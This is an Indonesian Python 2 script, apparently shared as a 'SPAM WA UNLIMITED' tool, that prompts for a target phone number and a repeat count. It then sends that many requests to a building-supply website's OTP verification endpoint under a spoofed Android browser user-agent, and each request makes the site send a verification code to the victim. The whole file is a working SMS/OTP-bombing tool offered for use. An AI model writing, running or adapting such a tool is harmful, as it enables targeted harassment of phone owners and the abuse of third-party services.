# -*- coding: utf8 -*-
import os, sys, json
import requests as r
C0 = '\033[0;36m'
G0 = '\033[0;32m'
W0 = '\033[0;37m'
R0 = '\033[0;31m'
Y0 = '\033[0;33m'
try:
 os.system("clear")
 print """
\033[36;1m.#######..########.....###....##.....##..##......##....###...
.##....##.##.....##...##.##...###...###..##..##..##...##.##..
.##.......##.....##..##...##..####.####..##..##..##..##...##.
..######..########..##.....##.##.###.##..##..##..##.##.....##
.......##.##........#########.##.....##..##..##..##.#########
..#....##.##........##.....##.##.....##..##..##..##.##.....##
..######..##........##.....##.##.....##...###..###..##.....##

     \033[35;1m╔══════════════════════════════════════════════╗
     \033[35;1m║    \033[32;1mAuthor  : Romli                           \033[35;1m║
     \033[35;1m║    \033[32;1mYouTube : AVATAR ID                       \033[35;1m║
     \033[35;1m║    \033[32;1mGithub  : https://github.com/Romli90000   \033[35;1m║
     \033[35;1m║    \033[32;1mTeam    : Cyber SumSel                    \033[35;1m║
     \033[35;1m╚══════════════════════════════════════════════╝
             \033[0;32m[   \x1b[00m\033[041m SPAM WA UNLIMITED \033[00m   \033[0;32m]


\033[35;1m╔═══════════════════════════╗
\033[35;1m║ \033[32;1mContoh Nomor 08××××××××   \033[35;1m║
\033[35;1m╚═══════════════════════════╝
"""
 print ("\033[31;1m════════════════════════════════════════════")
 gg = raw_input(" %s%s%s %s\033[32;1mMasukkan Nomor Target :  "%(W0,C0,W0,W0))
 print ("\033[31;1m════════════════════════════════════════════")
 gi = int(raw_input(" %s%s%s %s\033[32;1mMasukkan jumlah Spam  : "%(W0,C0,W0,W0)))
 print ("\033[31;1m════════════════════════════════════════════")
 c = 1
 for x in range(gi):
  h = json.loads(r.post("https://www.sobatbangun.com/otp-validation?p_p_id=SB_Registration_Otp_Portlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_resource_id=sendVerificationCode&p_p_cacheability=cacheLevelPage&_SB_Registration_Otp_Portlet_mobilePhoneNo=%s"%gg,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}).text)
  if h["status"] == 'success':
   print "%s[%s%s%s] %sSuccess %sspam to %s%s"%(W0,C0,str(c),W0,G0,W0,Y0,gg)
   c += 1
  else:
   print "%s[%s%s%s] %s\033[31;1mFailet %sspam to  %s%s"%(W0,C0,str(c),W0,R0,W0,Y0,gg)
   c += 1
# print (h)
except r.exceptions.ConnectionError:
   print "%s[%s!%s] %sPeriksa Koneksi Internet anda !!"%(W0,C0,W0,R0)
except KeyboardInterrupt:
   print "\r%s[%s-%s] %sKenapa Keluar Tod"%(W0,C0,W0,W0)
